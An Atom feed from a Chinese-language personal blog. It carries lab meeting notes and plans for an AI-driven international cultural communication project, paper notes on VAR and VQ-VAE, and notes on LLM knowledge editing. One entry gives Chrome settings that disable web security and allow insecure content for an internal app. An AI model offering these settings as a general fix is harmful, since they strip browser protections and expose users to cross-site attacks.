<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anthony&#39;s Blog</title>
  
  <subtitle>As you look around</subtitle>
  <link href="https://www.scery.com/atom.xml" rel="self"/>
  
  <link href="https://www.scery.com/"/>
  <updated>2024-12-16T00:48:28.556Z</updated>
  <id>https://www.scery.com/</id>
  
  <author>
    <name>HaoDong Wu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>精传系统页面权限配置</title>
    <link href="https://www.scery.com/%E7%B2%BE%E5%87%86%E5%9B%BD%E9%99%85%E4%BC%A0%E6%92%AD%E7%B3%BB%E7%BB%9F/%E7%B2%BE%E4%BC%A0%E7%B3%BB%E7%BB%9F%E9%A1%B5%E9%9D%A2%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE.htm"/>
    <id>https://www.scery.com/%E7%B2%BE%E5%87%86%E5%9B%BD%E9%99%85%E4%BC%A0%E6%92%AD%E7%B3%BB%E7%BB%9F/%E7%B2%BE%E4%BC%A0%E7%B3%BB%E7%BB%9F%E9%A1%B5%E9%9D%A2%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE.htm</id>
    <published>2024-12-16T00:48:25.000Z</published>
    <updated>2024-12-16T00:48:28.556Z</updated>
    
    <content type="html"><![CDATA[<ul><li><h3 id="允许Http页面WS连接"><a href="#允许Http页面WS连接" class="headerlink" title="允许Http页面WS连接"></a>允许Http页面WS连接</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chrome:<span class="regexp">//</span>flags/<span class="comment">#unsafely-treat-insecure-origin-as-secure</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">172.27</span>.<span class="number">48.26</span>:<span class="number">8000</span>,http:<span class="regexp">//</span><span class="number">172.25</span>.<span class="number">156.61</span>:<span class="number">8000</span></span><br></pre></td></tr></table></figure></li><li><h3 id="允许摄像头和麦克风默认权限"><a href="#允许摄像头和麦克风默认权限" class="headerlink" title="允许摄像头和麦克风默认权限"></a>允许摄像头和麦克风默认权限</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">原来启动浏览器的地址：C:\Users\xxxxx\AppData\Local\Google\Chrome\Application\chrome<span class="selector-class">.exe</span></span><br><span class="line"> <span class="attr">--args</span> <span class="attr">--disable-web-security</span> <span class="attr">--user-data-dir</span>=<span class="string">&quot;d:/chromecache&quot;</span> <span class="attr">--allow-running-insecure-content</span> <span class="attr">--autoplay-policy</span>=no-user-gesture-required</span><br></pre></td></tr></table></figure></li><li><h3 id="允许自动播放权限"><a href="#允许自动播放权限" class="headerlink" title="允许自动播放权限"></a>允许自动播放权限</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chrome:<span class="regexp">//</span>flags/<span class="comment">#autoplay-policy</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">172.27</span>.<span class="number">48.26</span>:<span class="number">8000</span>,http:<span class="regexp">//</span><span class="number">172.25</span>.<span class="number">156.61</span>:<span class="number">8000</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">精传系统前端页面Chrome权限配置</summary>
    
    
    
    
    <category term="精准国际传播" scheme="https://www.scery.com/tags/%E7%B2%BE%E5%87%86%E5%9B%BD%E9%99%85%E4%BC%A0%E6%92%AD/"/>
    
  </entry>
  
  <entry>
    <title>岳麓山数智传播 1</title>
    <link href="https://www.scery.com/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%201.htm"/>
    <id>https://www.scery.com/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%201.htm</id>
    <published>2024-12-15T08:54:00.000Z</published>
    <updated>2024-12-16T02:25:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333565.png" alt="Pasted image 20241215153804"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333606.png" alt="Pasted image 20241215153835"></p><p>智库是知识创新、政策研究和国际交流的重要平台，能够为大学提供智能辅助教学和智能课程设计等服务，从而推动大学教育的发展和国际影响力的提升。通过运用人工智能、大数据等技术，智库可以分析学生的学习情况，为教师提供个性化的教学建议，帮助学生更好地理解和掌握知识。例如，智库可以开发智能辅助教学系统，通过分析学生的答题情况，为教师提供针对性的教学方案，提高教学效果。智库拥有丰富的学术资源和研究经验，可以结合大学的学科特点和国际发展趋势，为大学设计符合时代需求的课程体系。此外，智库还可以为大学提供国际交流和合作的平台。智库与国际学术界和实务界保持着密切的联系，可以为大学引进国际优质教育资源，推动大学的国际化进程。例如，智库可以组织国际学术会议、研讨会等活动，邀请国内外专家学者共同探讨前沿问题和解决方案，提升大学的国际影响力。</p><h2 id="算法风险控制机制"><a href="#算法风险控制机制" class="headerlink" title="算法风险控制机制"></a>算法风险控制机制</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333629.png" alt="Pasted image 20241215154447"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333651.png" alt="Pasted image 20241215160123"></p><h2 id="精准国际传播内容生成"><a href="#精准国际传播内容生成" class="headerlink" title="精准国际传播内容生成"></a>精准国际传播内容生成</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333674.png" alt="Pasted image 20241215160207"></p><h2 id="国际传播的个性化内容推荐"><a href="#国际传播的个性化内容推荐" class="headerlink" title="国际传播的个性化内容推荐"></a>国际传播的个性化内容推荐</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333704.png" alt="Pasted image 20241215160541"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333744.png" alt="Pasted image 20241215160605"></p><h2 id="精准国际传播的智能化内容治理"><a href="#精准国际传播的智能化内容治理" class="headerlink" title="精准国际传播的智能化内容治理"></a>精准国际传播的智能化内容治理</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333764.png" alt="Pasted image 20241215160713"></p><h2 id="精准国际传播受众研究的新路径"><a href="#精准国际传播受众研究的新路径" class="headerlink" title="精准国际传播受众研究的新路径"></a>精准国际传播受众研究的新路径</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333791.png" alt="Pasted image 20241215161303"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333813.png" alt="Pasted image 20241215161401"></p><h2 id="生成式国际受众精准画像"><a href="#生成式国际受众精准画像" class="headerlink" title="生成式国际受众精准画像"></a>生成式国际受众精准画像</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333835.png" alt="Pasted image 20241215162430"></p><h2 id="知识图谱"><a href="#知识图谱" class="headerlink" title="知识图谱"></a>知识图谱</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333864.png" alt="Pasted image 20241215162520"></p><h2 id="基于人工智能的精准翻译与话语表达"><a href="#基于人工智能的精准翻译与话语表达" class="headerlink" title="基于人工智能的精准翻译与话语表达"></a>基于人工智能的精准翻译与话语表达</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333888.png" alt="Pasted image 20241215162617"></p><h2 id="多模态翻译策略数据库构建"><a href="#多模态翻译策略数据库构建" class="headerlink" title="多模态翻译策略数据库构建"></a>多模态翻译策略数据库构建</h2><p>从各种专业领域的文献、网站、论坛等收集不同语境(例如外交、政治、经济、文化、军事等)下的专业翻译数据，这些多模态数据包括原文和译文对、术语表、经典影视视频，新闻视频等。在数据采集的过程中，还需要确保数据的质量和可用性。这意味着需要对收集到的数据进行清洗和预处理，去除无效或不相关的信息，保留高质量的数据用于后续的分析和研究。同时，构建多模态数据库是一个持续的过程，需要不断地更新和扩充，以适应语言和文化的发展变化。通过定期收集新的数据，并对现有数据进行维护和优化，可以确保数据库始终保持活力和相关性。</p><h2 id="精准多角度翻译策略的评估与优化"><a href="#精准多角度翻译策略的评估与优化" class="headerlink" title="精准多角度翻译策略的评估与优化"></a>精准多角度翻译策略的评估与优化</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333924.png" alt="Pasted image 20241215162903">%%  %%</p><h2 id="精准话语表达方式的分析与评估"><a href="#精准话语表达方式的分析与评估" class="headerlink" title="精准话语表达方式的分析与评估"></a>精准话语表达方式的分析与评估</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333969.png" alt="Pasted image 20241215163148"></p><h2 id="整体系统框架参考"><a href="#整体系统框架参考" class="headerlink" title="整体系统框架参考"></a>整体系统框架参考</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102334025.png" alt="Pasted image 20241215163325"></p><h2 id="精准传播效果评估过程"><a href="#精准传播效果评估过程" class="headerlink" title="精准传播效果评估过程"></a>精准传播效果评估过程</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102334035.png" alt="Pasted image 20241215163642"></p><p><strong>文化战略服务的定义：</strong><br>文化战略服务是以推动文化全球化传播为核心，综合运用多学科理论、跨领域资源和人工智能手段，为不同文化的交流与融合提供战略支持的一系列服务。其目的是以文化符号为载体，传播优秀文化内容，促进全球文化互鉴，提升文化影响力，并在国际舞台上实现文化价值与商业价值的双赢。</p><ol><li><strong>文化符号的识别与传播</strong>：以文化符号为核心，如古建艺术、神话传说、非物质文化遗产等，构建文化传播矩阵，结合创新性与适应性，提高符号的国际认知度与影响力。例如，中华文化符号在“国潮化”浪潮中焕发新生，如《黑神话：悟空》等十大数字文化IP，以游戏、动漫、影视等形式迅速扩展国际市场。</li><li><strong>跨界联动与主体多元化</strong>：通过跨界合作与品牌联名，实现文化产品的全球化推广，打造文化传播的生态圈。报告提出，微短剧等新赛道为文化传播提供了新路径，形成多元主体共同参与的传播体系。</li><li><strong>数字技术赋能</strong>：利用虚拟现实、增强现实等技术，拓展文化交流的形式与场景，实现线上线下结合，突破地理限制，让文化传播更加广泛和深度。</li><li><strong>地方文化传播与区域热点打造</strong>：以地方特色文化为切入点，塑造国际传播热点。例如，2024年具有国际影响力的文化传播热点如“China Travel”的上海、美食文化的甘肃天水以及中轴线申遗成功的北京等，为地方文化走向国际提供范例。</li><li><strong>文化传播的精准化与本土化结合</strong>：通过对不同文化背景的受众研究，结合国际化视野与本土化表达方式，确保文化传播能够被准确理解和接受，推动文化的深度对话与互动。<br>文化战略服务的任务定位：<br> 湖南师范大学作为文化战略服务的重要实践者，展示了对文化传播战略的深刻理解，特别是通过符号矩阵和传播指数，科学评估和优化了中华文化的全球传播策略。这种基于数据驱动和前瞻分析的方式，为文化战略服务提供了坚实的智力支持。<br> 同时，未来在推进网络文化交流、主办国际文化论坛和组织全球文化活动发挥桥梁作用。通过构建“文化+科技”的传播模式以及推动跨界联动与多元主体合作，为实现中华文化的全球化传播树立了新的标杆，为国际社会提供了文化交流与合作的“中国方案”。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333565.png&quot; alt=&quot;Pasted image 20241215153804&quot;&gt;&lt;br&gt;&lt;img src</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>岳麓山数智传播</title>
    <link href="https://www.scery.com/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD.htm"/>
    <id>https://www.scery.com/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD.htm</id>
    <published>2024-12-12T07:10:00.000Z</published>
    <updated>2024-12-16T05:01:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>效能评估，预测、建议<br>1、文化传播效果分析——国际传播效能测评体系设计，<br>![[Pasted image 20241212153744.png]]</p><p>数据库：</p><ol><li><strong>多维度评价数据库</strong><ul><li><strong>文化内容分类</strong>：系统化收集和整理文化内容，涵盖主流意识形态、社会价值观、历史文化故事。</li><li><strong>传播媒介内容</strong>：包括所有形式的传播素材，如文字、图片、视频等，确保内容的多样性。</li><li><strong>权重配置与技术指标库</strong>：制定各指标的权重，监测内容传输速度、受众互动频率。</li><li><strong>受众与行为数据</strong>：涵盖人口统计、用户点击、观看和分享行为，以及情感反馈分析。</li></ul></li><li><strong>受众行为分析数据库</strong><ul><li><strong>用户画像</strong>：通过分析兴趣标签和语言习惯，构建详尽的受众文化背景。</li><li><strong>传播路径和数据时效性</strong>：追踪受众接触信息的渠道和行为链路，并对比不同时间点的数据。</li></ul></li><li><strong>数据监测与反馈数据库</strong><ul><li><strong>舆情和效果评估数据</strong>：实时抓取社交媒体、新闻网站数据，评估传播效果的广度与深度。</li></ul></li><li><strong>语言文化数据库</strong><ul><li><strong>语汇资源与语义网络数据库</strong>：储备多语言词汇表，并分析新概念间的语义关联性。</li></ul></li><li><strong>文化背景知识库</strong><ul><li><strong>文化语境和历史关联性</strong>：整合目标受众的文化背景、习俗，与传统文化故事的结合点。</li></ul></li><li><strong>传播路径优化数据库</strong><ul><li><strong>渠道数据与内容定制规则库</strong>：通过算法支持优化传播路径和内容推荐。</li></ul></li><li><strong>情感与认知反馈数据库</strong><ul><li><strong>情绪与认知评估</strong>：分析受众对新概念的情感反馈，评估概念接受度与传播难点。<br>模型层面：</li></ul><ol><li><strong>传播效能理论评估模型</strong>：通过权重分配和评价准则，量化主流意识形态的传播力。</li><li><strong>文化传播行为模型</strong>：国际传播的影响因子（如价值观冲突、信息流通等），时政背景下的传播适应性模型。</li><li><strong>传播效果分析模型</strong>：实现文化传播深度与广度的定量与定性分析。<br>算法层面：</li><li>多维数据加权平均计算（基于图片中的权重）</li><li>AHP（层次分析法）模型，用于确定指标重要性。</li><li>信息流通的最优路径分析：跨文化语境考虑，动态调整信息传播路径，考虑不同地区的文化语境和接受度，并结合外部环境变化，动态调整传播策略。</li><li>社交网络传播模拟算法。</li><li>模拟受众反馈的机器学习算法（如情感分析、关键字提取）。</li><li>国际化语言文化差异的自然语言处理算法。</li><li>根据时间和环境变化实时调整传播策略的动态算法。</li><li><strong>虚假信息识别算法</strong>：利用自然语言处理和机器学习算法，识别并过滤虚假和垃圾信息。利用Agent结合多源信源验证，加强对新闻真实性的识别。</li><li><strong>内容多样性算法</strong>：多视角推荐算法，避免信息茧房，通过多视角视图和交叉推荐，扩展信息视野。有利于模型的反偏见决策，防止内容个性化过程中的偏见强化。</li><li><strong>意识形态安全算法</strong>：分析内容的情感倾向和意识形态立场，预判潜在风险。在识别到敏感内容时，触发警示机制。<br>应用层面：</li><li><strong>媒体智优 (MediaSmart)</strong>：提供主流媒体内容的优化策略，提高信息质量和传播效果。</li><li><strong>文化桥梁 (CultureBridge)</strong>：针对国际受众文化适应的传播内容定制。</li><li><strong>流通监控器 (FlowMonitor)</strong>：信息流通动态监测（通过技术指标如主流媒体信息传播的丰富度，国家党政方针、重大决策传播的针对性和精准度）。</li><li><strong>断点分析仪 (BreakPointAnalyser)</strong>：传播中断点与信息滞留的分析。</li><li><strong>全景透视 (PanoramaReach)</strong>：评估传播覆盖范围与受众渗透率，优化推广策略。</li><li><strong>效能评估器 (EfficiencyEvaluator)</strong>：基于C10-C15的传播效果综合评价（多特征传播效果综合评价）。</li><li><strong>数据驱动者 (DataDriver)</strong>：利用数据优化传播效率，实现智能化传播管理。。</li><li><strong>湖湘视界</strong>：借助多模态视频生成模型类似sora，增强湖湘乃至中国文化传播的互动性与吸引力。</li><li><strong>事实核查平台</strong>：对内容真实度校验，结合事实核查资源，增强内容质量验证。通过用户反馈标记可疑内容，改进内容筛选。</li><li><strong>真相守卫者 (TruthGuard)</strong>：聚焦于涉华虚假信息的识别与反制，确保信息的真实性和公正性。</li><li><strong>叙事追踪器 (NarrativeTrack)</strong>：用于分析和评估国际传播中的叙事策略与效果，优化传播路径。</li><li><strong>舆情智控 (AI ViewControl)</strong>：研究与管理人工智能生成内容对舆论生态的影响，维护信息健康。</li><li><strong>镜鉴平台 (ReflectiveLens)</strong>：应对国际舆论战，提供虚假信息的快速检测与应对策略。<br>2、精准化传播新语汇、新概念、新路径——例如特朗普和习主席讲话，习主席谈到中国是龙的传人，但是龙在西方是邪恶的代表，要把这个新语汇传播出去。新路径就是</li></ol></li></ol><p>文化传播效果分析<br>1、人工智能生产内容对舆论生态的挑战、影响与治理研究<br>2、中国文化对外传播话语构建、叙事策略与效果评价研究<br>3、国际传播效能测评体系设计和机制建设研究<br>4、国际舆论战中涉华虚假信息传播及对策研究</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;效能评估，预测、建议&lt;br&gt;1、文化传播效果分析——国际传播效能测评体系设计，&lt;br&gt;![[Pasted image 20241212153744.png]]&lt;/p&gt;
&lt;p&gt;数据库：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;多维度评价数据库&lt;/strong&gt;&lt;ul&gt;
&lt;l</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2024年12月12日新传会议</title>
    <link href="https://www.scery.com/%E6%96%B0%E4%BC%A0%E9%A1%B9%E7%9B%AE/2024%E5%B9%B412%E6%9C%8812%E6%97%A5%E6%96%B0%E4%BC%A0%E4%BC%9A%E8%AE%AE.htm"/>
    <id>https://www.scery.com/%E6%96%B0%E4%BC%A0%E9%A1%B9%E7%9B%AE/2024%E5%B9%B412%E6%9C%8812%E6%97%A5%E6%96%B0%E4%BC%A0%E4%BC%9A%E8%AE%AE.htm</id>
    <published>2024-12-11T06:59:00.000Z</published>
    <updated>2024-12-16T05:03:00.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li>筛选</li><li>人工智能辅助的内容分析</li><li>**场景区分（比较擅长，没有），分场景，人物，地点，环境，辅助生成标签，提出一个argument</li><li><strong>转场，codebook标签总结的，评论分析</strong></li><li>完成度</li><li>评估</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;筛选&lt;/li&gt;
&lt;li&gt;人工智能辅助的内容分析&lt;/li&gt;
&lt;li&gt;**场景区分（比较擅长，没有），分场景，人物，地点，环境，辅助生成标签，提出一个argument&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;转场，codebook标签总结的，评论分析&lt;/strong&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>岳麓山文化数智传播实验室第三次会议</title>
    <link href="https://www.scery.com/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%96%87%E5%8C%96%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BC%9A%E8%AE%AE.htm"/>
    <id>https://www.scery.com/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%96%87%E5%8C%96%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BC%9A%E8%AE%AE.htm</id>
    <published>2024-12-11T01:00:00.000Z</published>
    <updated>2024-12-16T05:01:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="三个要求："><a href="#三个要求：" class="headerlink" title="三个要求："></a>三个要求：</h1><h2 id="一、实验室建立的重要目的"><a href="#一、实验室建立的重要目的" class="headerlink" title="一、实验室建立的重要目的"></a>一、实验室建立的重要目的</h2><h3 id="建设目标："><a href="#建设目标：" class="headerlink" title="建设目标："></a>建设目标：</h3><h4 id="1-湖大层面"><a href="#1-湖大层面" class="headerlink" title="1.湖大层面"></a>1.湖大层面</h4><p>建设思想文化库、全球范围的思想文化动态监测站、服务国家和社会。</p><h4 id="2-中华传统文化大数据，如何建设好？传播出去？"><a href="#2-中华传统文化大数据，如何建设好？传播出去？" class="headerlink" title="2.中华传统文化大数据，如何建设好？传播出去？"></a>2.中华传统文化大数据，如何建设好？传播出去？</h4><h4 id="3-文化传播的效果评价（师大）"><a href="#3-文化传播的效果评价（师大）" class="headerlink" title="3.文化传播的效果评价（师大）"></a>3.文化传播的效果评价（师大）</h4><p>思想文化交流交融交锋中占据主导，师大重要是传播的效能上做一些事。</p><h4 id="4-实验室经费10亿。"><a href="#4-实验室经费10亿。" class="headerlink" title="4.实验室经费10亿。"></a>4.实验室经费10亿。</h4><h3 id="讨论："><a href="#讨论：" class="headerlink" title="讨论："></a>讨论：</h3><p>@比较有新意的是文化动态感知，不要太偏技术，让大众能感知大数据的动态效果（实时发布什么东西），舆情监测这种东西尽可能避开，避开之后就是新的阵地<br>@跟产业对应上，要提供高质量的文化服务，支撑整个湖南省的志愿服务<br>@湖大和师大要一起搞一块<br>@对外的文化库，生成什么，满足中宣部的要求。实验室机构的实体化比较关键<br>@L0依托超算平台<br>@L1对外传播文化库<br>@L2精准传播演算<br>@L3自主自动体系<br>@超算角度，可信、可控，数据算量可信，训练过程可控，文旅产业对大模型搞不懂…</p><h3 id="会议附图："><a href="#会议附图：" class="headerlink" title="会议附图："></a>会议附图：</h3><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017334.png" alt="IMG_1758"></p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017335.png" alt="IMG_1757"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017336.png" alt="IMG_1759"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017337.png" alt="IMG_1762 2"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017338.png" alt="IMG_1761"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017339.png" alt="IMG_1762"></p><h2 id="二、为什么放在湖南，有什么优势"><a href="#二、为什么放在湖南，有什么优势" class="headerlink" title="二、为什么放在湖南，有什么优势"></a>二、为什么放在湖南，有什么优势</h2><h2 id="三、服务两个目标，设计哪些重大的场景的设计，让人耳目一新"><a href="#三、服务两个目标，设计哪些重大的场景的设计，让人耳目一新" class="headerlink" title="三、服务两个目标，设计哪些重大的场景的设计，让人耳目一新"></a>三、服务两个目标，设计哪些重大的场景的设计，让人耳目一新</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;三个要求：&quot;&gt;&lt;a href=&quot;#三个要求：&quot; class=&quot;headerlink&quot; title=&quot;三个要求：&quot;&gt;&lt;/a&gt;三个要求：&lt;/h1&gt;&lt;h2 id=&quot;一、实验室建立的重要目的&quot;&gt;&lt;a href=&quot;#一、实验室建立的重要目的&quot; class=&quot;headerli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>VAR论文</title>
    <link href="https://www.scery.com/%E8%AE%BA%E6%96%87/VAR%E8%AE%BA%E6%96%87.htm"/>
    <id>https://www.scery.com/%E8%AE%BA%E6%96%87/VAR%E8%AE%BA%E6%96%87.htm</id>
    <published>2024-12-07T02:29:00.000Z</published>
    <updated>2024-12-16T05:01:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Visual-Autoregressive-Modeling-Scalable-Image-Generation-via-Next-Scale-Prediction"><a href="#Visual-Autoregressive-Modeling-Scalable-Image-Generation-via-Next-Scale-Prediction" class="headerlink" title="Visual Autoregressive Modeling: Scalable Image Generation via Next-Scale Prediction"></a>Visual Autoregressive Modeling: Scalable Image Generation via Next-Scale Prediction</h1><p>本文提出的图像自回归（VAR）超越Diffusion，在大模型上的Scaling Laws和zero-shot generalization可以迁移过来<br>OpenAI 就曾推出一个图像版的 GPT 模型。具体来说，他们先将一张二维图片拉平成一个序列（sequence），使之可以像语言模型中的句子那样处理。因为图像中的颜色限制在 256 色范围内，因此可以将颜色当作 token，token 的数量就是 256 个。接下来，使用自回归模型（Auto-regressive Model），架构与 GPT 类似，进行训练。</p><p>生成图像时，这种模型会按顺序一排一排地生成像素，这个生成顺序被称为 ‘光栅顺序（Raster Order）’，有点像视频显示格式Progressive scanning的逐行扫描的样子。这种方法可以生成相对清晰的图像，但计算时间较长，因此在实际的图像生成任务中，多数模型会采用一次到位的生成方法，以提高生成效率。</p><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">改进点：</span><br><span class="line"><span class="keyword">Next</span> scale prediction</span><br><span class="line">而不是<span class="keyword">Next</span> token prediction</span><br></pre></td></tr></table></figure><p>Next token prediction缺点：<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102751933.png" alt="Pasted image 20241207105924"></p><p>我们知道VAE可以把图片编码成符合标准正态分布的向量即可。让向量符合标准正态分布的原因是方便随机采样。同时，需要强调的是，VAE编码出来的向量是<strong>连续向量</strong>，也就是向量的每一维都是浮点数。如果把向量的某一维稍微改动0.0001，解码器还是认得这个向量，并且会生成一张和原向量对应图片差不多的图片。</p><p>但是，VAE生成出来的图片都不是很好看。VQ-VAE的作者认为，VAE的生成图片之所以质量不高，是因为图片被编码成了连续向量。而实际上，把图片编码成<strong>离散向量</strong>会更加自然。比如我们想让画家画一个人，我们会说这个是男是女，年龄是偏老还是偏年轻，体型是胖还是壮，而不会说这个人性别是0.5，年龄是0.6，体型是0.7。因此，VQ-VAE会把图片编码成离散向量，如下图所示。</p><p>神经网络会默认输入满足一个连续的分布，而不善于处理离散的输入。如果你直接输入0, 1, 2这些数字，神经网络会默认1是一个处于0, 2中间的一种状态。为了解决这一问题，我们可以借鉴NLP中对于离散单词的处理方法。为了处理离散的输入单词，NLP模型的第一层一般都是词嵌入层，它可以把每个输入单词都映射到一个独一无二的连续向量上。这样，每个离散的数字都变成了一个特别的连续向量了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Visual-Autoregressive-Modeling-Scalable-Image-Generation-via-Next-Scale-Prediction&quot;&gt;&lt;a href=&quot;#Visual-Autoregressive-Modeling-Scalabl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>20241202组会</title>
    <link href="https://www.scery.com/%E7%BB%84%E4%BC%9A/20241202%E7%BB%84%E4%BC%9A.htm"/>
    <id>https://www.scery.com/%E7%BB%84%E4%BC%9A/20241202%E7%BB%84%E4%BC%9A.htm</id>
    <published>2024-12-02T11:07:00.000Z</published>
    <updated>2024-12-02T12:17:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="rome和memit"><a href="#rome和memit" class="headerlink" title="rome和memit"></a>rome和memit</h2><h3 id="语言大模型知识冲突"><a href="#语言大模型知识冲突" class="headerlink" title="语言大模型知识冲突"></a>语言大模型知识冲突</h3><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216130320559.png" alt="Pasted image 20241202191911"></p><h3 id="knock-out"><a href="#knock-out" class="headerlink" title="knock out"></a>knock out</h3><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216130320560.png" alt="Pasted image 20241202192353"></p><h3 id="研究方向"><a href="#研究方向" class="headerlink" title="研究方向"></a>研究方向</h3><p>多智能体冲突<br>多模态大模型中编码文本+编码图像的冲突<br>外部检索和多模态知识的冲突</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;rome和memit&quot;&gt;&lt;a href=&quot;#rome和memit&quot; class=&quot;headerlink&quot; title=&quot;rome和memit&quot;&gt;&lt;/a&gt;rome和memit&lt;/h2&gt;&lt;h3 id=&quot;语言大模型知识冲突&quot;&gt;&lt;a href=&quot;#语言大模型知识冲突&quot; c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>VITS</title>
    <link href="https://www.scery.com/VITS.htm"/>
    <id>https://www.scery.com/VITS.htm</id>
    <published>2024-09-16T08:21:08.000Z</published>
    <updated>2024-09-16T08:42:46.469Z</updated>
    
